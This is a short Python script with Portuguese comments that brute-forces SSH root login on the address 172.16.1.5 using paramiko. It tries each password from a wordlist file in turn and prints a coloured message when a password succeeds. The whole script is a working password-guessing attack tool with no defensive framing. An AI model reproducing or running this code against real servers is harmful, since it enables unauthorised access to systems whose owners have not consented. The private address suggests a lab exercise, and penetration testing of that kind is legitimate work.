import paramiko
import sys
import time

# Códigos ANSI
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLINK = "\033[5m"
RESET = "\033[0m"

ssh = paramiko.SSHClient()
ssh.load_system_host_keys()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

with open('lista.txt') as f:
    for palavra in f:
        senha = palavra.strip()

        # Mostra "Testando com:" piscando enquanto testa
        sys.stdout.write(f"\r{YELLOW}{BLINK}Usuario=root Testando com a senha: {senha}{RESET}")
        sys.stdout.flush()
        time.sleep(0.2)  # reduzido para 0.2s, ou pode remover

        try:
            # Reduzido o tempo de conexão para agilizar a troca de senhas
            ssh.connect('172.16.1.5', username='root', password=senha, timeout=1)
        except paramiko.ssh_exception.AuthenticationException:
            sys.stdout.write(f"\r{YELLOW}Usuario=root Testando com a senha: {senha}{RESET}  \n")
            print(f"{RED}[-] Senha incorreta{RESET}\n")
        except Exception as e:
            print(f"\n[!] Erro inesperado com a senha '{senha}': {e}")
        else:
            print(f"\n{GREEN}{BLINK}[+] Senha Encontrada ---> {senha}{RESET}")
            break

ssh.close()
